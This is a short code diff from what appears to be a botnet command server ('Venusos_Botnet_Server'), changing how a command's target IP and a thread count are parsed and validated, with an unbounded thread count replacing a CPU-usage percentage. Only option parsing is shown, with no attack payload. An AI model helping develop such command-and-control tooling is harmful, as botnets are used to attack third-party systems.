@@ -43,7 +43,7 @@ namespace Venusos_Botnet_Server
 
             try
             {
-                command.IP = IPAddress.Parse(options[2]);
+                command.IP = IPAddress.Parse(options[2]).ToString();
             }
             catch
             {
@@ -70,11 +70,11 @@ namespace Venusos_Botnet_Server
 
             try
             {
-                command.CpuUsage = (Convert.ToInt32(options[5]) is > 0 and <= 100) ? Convert.ToInt32(options[5]) : throw new Exception();
+                command.Threads = (Convert.ToInt32(options[5]) is > 0) ? Convert.ToInt32(options[5]) : throw new Exception();
             }
             catch
             {
-                error += "wrong cpu usage percentage\n\r";
+                error += "wrong threads ammount\n\r";
             }
 
             if (error == "Errors:\n\r")
